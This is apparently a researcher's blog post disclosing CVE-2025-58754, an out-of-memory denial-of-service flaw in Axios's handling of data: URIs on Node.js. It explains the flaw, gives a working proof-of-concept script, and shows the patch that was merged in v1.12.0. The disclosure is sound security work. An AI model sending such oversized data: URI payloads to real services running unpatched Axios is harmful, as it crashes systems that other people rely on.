+++
title = "OOM/DoS Vulnerability in Axios (CVE-2025-58754)"
date = "2025-09-11"
draft = false
+++

### What is Axios?

[Axios](https://github.com/axios/axios) is a **promise-based HTTP client** for Node.js and browsers. It’s one of the most popular libraries in the JavaScript ecosystem, powering countless apps, frameworks, and services.

Because of its huge install base security research here particularly impactful.

### How It Started

2 weeks ago while working on a personal project, I've planned to use **Axios**, a library I've relied on many times before.
At that moment I realized that although I've had good success in bug bounty hunting, I never had a CVE in a serious, widely used open-source project.
That thought motivated me to dive into Axios and look for issues.
I started my research by reading old CVEs and GitHub issues related to it. This helped me understand the kind of problems that had been discovered before and where weaknesses might exist. With that context I began auditing specific areas of the codebase.

That's when I uncovered an **Out-of-Memory Denial-of-Service (OOM/DoS)** issue, which has now been assigned **CVE-2025-58754**.

### Summary of the Vulnerability

When Axios runs on Node.js and is given a `data:` URL it doesn’t perform an HTTP request. Instead, it decodes the payload into memory (`Buffer`/`Blob`) and returns a fake `200 OK` response.

unlike HTTP responses this path ignores `maxContentLength` and `maxBodyLength`.
which means an attacker can provide a **very large `data:` URI** and cause Axios to allocate unbounded memory leading to an **OOM crash**.

This happens even if the caller requested `responseType: 'stream'`.

### Technical Details

The vulnerable logic lives in the Node.js adapter (`lib/adapters/http.js`):

```js
if (protocol === 'data:') {
  convertedData = fromDataURI(config.url, responseType === 'blob', {
    Blob: config.env && config.env.Blob
  });
  return settle(resolve, reject, { data: convertedData, status: 200, ... });
}
```
Where I found the `fromDataURI()` decoder function

The decoder (`lib/helpers/fromDataURI.js`) turns the full Base64 payload into a `Buffer` without size checks:

```js
const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');
```

Unlike HTTP where response size is enforced via `maxContentLength` / `maxBodyLength`, this code path never checks limits even if the developer enforced them.

Result: A single oversized `data:` URI can **crash the Node.js process**.

### Proof-of-Concept

```js
const axios = require('axios');

async function main() {
  const base64Size = 160_000_000; // ~120 MB decoded
  const base64 = 'A'.repeat(base64Size);
  const uri = 'data:application/octet-stream;base64,' + base64;

  const response = await axios.get(uri, { responseType: 'arraybuffer' });
  console.log('Received bytes:', response.data.length);
}

main();
```

Run with limited heap:

```bash
node --max-old-space-size=100 poc.js
```

Node crashes with “heap out of memory”.

```
<--- Last few GCs --->
…
FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory
1: 0x… node::Abort() …
```


### The Fix I Contributed

After triaging the issue I decided not to wait for the maintainers to fix it, but to write the fix myself and open a **[pull request](https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593)** to Axios.

The fix ensures Axios now **respects `maxContentLength` when handling `data:` URIs** the same way it does for HTTP responses.
To avoid unbounded allocations I have added a helper that can **estimate the decoded size of a `data:` URI without allocating huge Buffers**.

The maintainers reviewed my patch and it was merged into Axios — released officially in **v1.12.0**.
{{< figure src="/images/release.jpg" alt="Axios OOM DoS" width="400px" class="center" >}}


#### `http.js` adapter

```js
import estimateDataURLDecodedBytes from '../helpers/estimateDataURLDecodedBytes.js';

if (protocol === 'data:') {
  // Apply the same semantics as HTTP: only enforce if a finite, non-negative cap is set.
  if (config.maxContentLength > -1) {
    // Use the exact string passed to fromDataURI (config.url); fall back to fullPath if needed.
    const dataUrl = String(config.url || fullPath || '');
    const estimated = estimateDataURLDecodedBytes(dataUrl);

    if (estimated > config.maxContentLength) {
      return reject(new AxiosError(
        'maxContentLength size of ' + config.maxContentLength + ' exceeded',
        AxiosError.ERR_BAD_RESPONSE,
        config
      ));
    }
  }
```

#### `estimateDataURLDecodedBytes.js`

```js
/**
 * Estimate decoded byte length of a data:// URL *without* allocating large buffers.
 * - For base64: compute exact decoded size using length and padding;
 *               handle %XX at the character-count level (no string allocation).
 * - For non-base64: use UTF-8 byteLength of the encoded body as a safe upper bound.
 *
 * @param {string} url
 * @returns {number}
 */
export default function estimateDataURLDecodedBytes(url) {
  if (!url || typeof url !== 'string') return 0;
  if (!url.startsWith('data:')) return 0;

  const comma = url.indexOf(',');
  if (comma < 0) return 0;

  const meta = url.slice(5, comma);
  const body = url.slice(comma + 1);
  const isBase64 = /;base64/i.test(meta);

  if (isBase64) {
    let effectiveLen = body.length;
    const len = body.length;

    for (let i = 0; i < len; i++) {
      if (body.charCodeAt(i) === 37 /* '%' */ && i + 2 < len) {
        const a = body.charCodeAt(i + 1);
        const b = body.charCodeAt(i + 2);
        const isHex =
          ((a >= 48 && a <= 57) || (a >= 65 && a <= 70) || (a >= 97 && a <= 102)) &&
          ((b >= 48 && b <= 57) || (b >= 65 && b <= 70) || (b >= 97 && b <= 102));

        if (isHex) {
          effectiveLen -= 2;
          i += 2;
        }
      }
    }

    let pad = 0;
    let idx = len - 1;

    const tailIsPct3D = (j) =>
      j >= 2 &&
      body.charCodeAt(j - 2) === 37 && // '%'
      body.charCodeAt(j - 1) === 51 && // '3'
      (body.charCodeAt(j) === 68 || body.charCodeAt(j) === 100); // 'D' or 'd'

    if (idx >= 0) {
      if (body.charCodeAt(idx) === 61 /* '=' */) {
        pad++;
        idx--;
      } else if (tailIsPct3D(idx)) {
        pad++;
        idx -= 3;
      }
    }

    if (pad === 1 && idx >= 0) {
      if (body.charCodeAt(idx) === 61 /* '=' */) {
        pad++;
      } else if (tailIsPct3D(idx)) {
        pad++;
      }
    }

    const groups = Math.floor(effectiveLen / 4);
    const bytes = groups * 3 - (pad || 0);
    return bytes > 0 ? bytes : 0;
  }

  return Buffer.byteLength(body, 'utf8');
}
```

This patch introduces a **safe way to estimate decoded size** of `data:` URIs.
If the estimated size exceeds `maxContentLength`, Axios now **rejects the request safely** instead of crashing Node.


### Final Thoughts
What began as curiosity on a weekend turned into a vulnerability discovery and a published **CVE in one of the most widely used Node.js libraries with 67,041,401 weekly downloads**.
This was not just about finding a bug, it was about contributing back to opensource community and helping the ecosystem stay secure.

---

#### Timeline

* **31 Aug** → Vulnerability reported
* **2 Sep** → Maintainers triaged the report
* **9 Sep** → CVE assigned (`CVE-2025-58754`)
* **9 Sep** → Submitted PR with fix → reviewed & merged
* **11 Sep** → Patch released in **Axios v1.12.0** and CVE published

#### Acknowledgments

* Thanks to **Jaay Saayman** for working with me directly through the process.
* Thanks to **Dmitriy Mozgovoy** for reviewing my PR.
* And props to **GitHub Security** for the quick CVE assignment.

#### Advisory & Upgrade

* CVE: [CVE-2025-58754 (MITRE)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58754)
* GitHub Advisory: [GHSA-4hjh-wcwx-xvwj](https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj)
* **All Axios versions < 1.12.0 are vulnerable.**